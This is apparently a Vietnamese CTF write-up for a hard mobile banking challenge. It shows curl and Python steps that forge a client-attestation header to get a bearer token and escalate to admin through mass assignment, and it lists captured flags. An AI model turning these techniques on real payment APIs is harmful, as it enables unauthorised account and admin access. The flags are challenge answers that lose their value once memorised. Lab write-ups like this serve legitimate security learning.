# Meridian Pay — Mobile (Hard)

**Flag:** ba trong bốn objective · **Files:** `meridian-pay-3.2.1.apk.zip`, 12771 B, bên trong là APK 16885 B sha256 `447c3cd07770cfd78c6601f9076167208e5b670f3708be085cb69d08f741efa1` · **Dịch vụ:** `https://web-3f25599ac74e8a91.web.h7tex.com`

```
v1  H7CTF{474de245-b63a-4fc0-b9f8-b7dec75e0f27}
v2  H7CTF{fc3b3bd4-7fc2-4679-8150-9d0ce062c50b}
v4  H7CTF{2e58befc-e322-4563-83ae-2f1c00a0277f}
v3  chưa lấy được
```

## Đề bài

Một neobank "ship vội và tin tất cả mọi người": app tin server, server tin app, và cả hai tin
cái điện thoại bên dưới. Đề nói có bốn chỗ nứt riêng biệt, một chỗ một cờ, nằm rải giữa app
và API phía sau.

Cho một APK 12.5 KB và một instance HTTP. Bốn objective độc lập, không cần cờ này để ra cờ kia.

## Phân tích ban đầu

APK nhỏ bất thường. Mở ra chỉ có `AndroidManifest.xml`, `classes.dex` 13776 B, `resources.arsc`
1100 B, một layout và `META-INF/`. Không lib, không asset. Build của D8 ở `compilation-mode=debug`,
`min-api=24`.

`strings` trên dex cho ra đúng những gì cần: `/api/v1/auth/device`, `/api/v1/promo/public`,
`/files/`, `device_id`, `seedReceipts`, `val$ftoken`, `Authenticating device...`. Điều quan trọng
nhất là thứ không có: không chuỗi `H7CTF{` nào trong tệp. Cờ nằm phía server, APK chỉ là tài liệu.

Decompile bằng androguard để đọc thân hàm, thấy ba chỗ tác giả describe là "trust":

- `ApiClient` hardcode `X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)`. Server dùng chuỗi
  đó như bằng chứng thiết bị hợp lệ, tức client tự khai là mình được attest.
- `Session.setBaseUrl(...)` lấy thẳng chữ nhập trên UI, `RouterActivity` nhận deep link `?url=` và
  ghi đè cùng giá trị đó trong SharedPreferences.
- `ExportProvider` là provider đã export, đường dẫn bên trong đi qua
  `new File(receiptsDir, path.substring(7))` không lọc `..`, còn `seedReceipts` thì ghi dữ liệu vào `files/`.

Vậy hướng đánh là gọi API đúng theo cách app gọi, rồi khoét thêm vào hai chỗ server tin client quá
mức: cái header tự khai, và body của `PATCH /api/v1/profile`.

## Các hướng đã loại

Log đầy đủ ở `notes.md`.

1. Cờ giấu trong APK: không có chuỗi `H7CTF{` nào trong `classes.dex` hay tài nguyên. Nghỉ.
2. Chữ ký JWT yếu để giả mạo user khác: 1144 candidate so bằng HMAC với chữ ký thật,
   `[-] secret not found in 1144 candidates`, `alg` là HS256 chuẩn với
   `{"sub":"1001","iat":1790412496,"exp":1790498896}`.
3. IDOR qua `device_id`: tám giá trị (`admin`, `0`, `1`, `1000`, `1002`, `MP-0041-8827`,
   `../../etc/passwd`, `*`) đều trả về `sub=1001 name=Alicia Reyes`. Server không dùng nó làm khoá tra.
4. `tier` là chiều phân quyền thứ hai: đặt `platinum/merchant/vip/owner/enterprise/staff/internal`
   rồi đọc lại cả ba endpoint có cờ, không đổi gì. `PATCH {"tier":"gold"}` chỉ báo `updated:["tier"]`.
5. Có endpoint ẩn chưa tìm: quét 40 đường dẫn, chỉ 6 cái không trả 404
   (`auth/device`, `promo/public`, `internal/promo`, `accounts/me`, `admin/ledger`, `profile`).
   `POST /api/v1/promo/public` trả 405.

## Chuỗi khai thác

**Bước 1 - Xin bearer bằng đúng header của app.** `POST /api/v1/auth/device` mà thiếu header thì
server từ chối:

```bash
curl -sk -X POST $U/api/v1/auth/device -H 'Content-Type: application/json' \
     -d '{"device_id":"probe-1"}'
```

```
{"error":"client attestation required"}
```

Gắn thêm cái header app gửi là đủ, và `device_id` có là gì cũng được:

```bash
curl -sk -X POST $U/api/v1/auth/device \
     -H 'X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)' \
     -H 'Content-Type: application/json' -d '{"device_id":"probe-1"}'
```

Response 200 có khoá `token`, một JWT HS256 mà payload là `{"sub":"1001",...}`. Server cấp bearer
của member 1001 cho bất kỳ ai gõ đúng chuỗi phân nhánh client.

**Bước 2 - v1.** Trang `promo/public` là trang công khai, và nó có sẵn links tới chỗ cần tới:

```html
<p>Enrolled members can finish loyalty sign-up in the app: <a href="/api/v1/internal/promo">complete enrollment</a>.</p>
```

Gọi `/api/v1/internal/promo` với header attested + bearer:

```
200  180  <html><body><h3>Meridian Pay - Loyalty Enrollment</h3><p>Welcome back, member 1001. Enrollment confirmation:</p><pre>H7CTF{474de245-b63a-4fc
```

**Bước 3 - v2, qua mass assignment.** `PATCH /api/v1/profile` lưu thẳng những gì body gửi lên,
trong đó có `role` (chỉ `email`/`name`/`role`/`tier` là được ghi). Đặt `role=admin` rồi đọc sổ cái:

```python
req("/api/v1/profile", "PATCH", {"role": "admin"}, hdr=A)
print(req("/api/v1/admin/ledger", hdr=A))
```

```
200  152  {"corporate_master_key_rotation":"H7CTF{fc3b3bd4-7fc2-4679-8150-9d0ce062c50b}","generated":"2026-09-24","note":"admin-only consolidated ledg
```

Cùng đường dẫn đó trước khi đổi role trả `{"error":"admin role required"}`.

**Bước 4 - v4.** Cùng một bearer device session mở `/api/v1/accounts/me`:

```
1) accounts/me: 200 {"account":{"balance_cents":418233,"memo":"personal checking","number":"MP-0041-8827",
"owner":1001,"type":"checking"},"onboarding_memo":"session verified from device -
H7CTF{2e58befc-e322-4563-83ae-2f1c00a0277f}","user_id":1001}
```

`onboarding_memo` mang cờ vì server coi "đúng header app" là bằng chứng phiên đã được kiểm trên
thiết bị. Phía client thì đúng là có chỗ để lộ phiên: JWT nằm plaintext trong SharedPreferences,
và `ExportProvider` export được, đường dẫn không lọc `..`.

**Bước 5 - Kiểm chứng lại toàn bộ.** Trước khi nộp, chạy lại từ đầu một lượt: xin token mới, rồi
đọc ba endpoint. Ba cờ ra đúng như trên. `tier` được đặt qua lại bảy giá trị trong lượt quét đó
nên profile đã bị sửa; ba endpoint vẫn chỉ trả ba cờ ấy, không phát sinh thêm.

## Flag
```bash
python exploit.py https://web-3f25599ac74e8a91.web.h7tex.com
```

```
v1 /api/v1/internal/promo   H7CTF{474de245-b63a-4fc0-b9f8-b7dec75e0f27}
v2 /api/v1/admin/ledger     H7CTF{fc3b3bd4-7fc2-4679-8150-9d0ce062c50b}
v4 /api/v1/accounts/me      H7CTF{2e58befc-e322-4563-83ae-2f1c00a0277f}
v3 - chưa lấy được, 5/… solve
```

Instance đã hết hạn sau lần chạy đó (hết 45 phút của session). Ba cờ trên là kết quả tự chạy lại
và tự kiểm trên instance; hồ sơ này không ghi nhận trạng thái nộp lên nền tảng. v3 còn hai lead dở,
ghi cụ thể ở cuối `notes.md`.
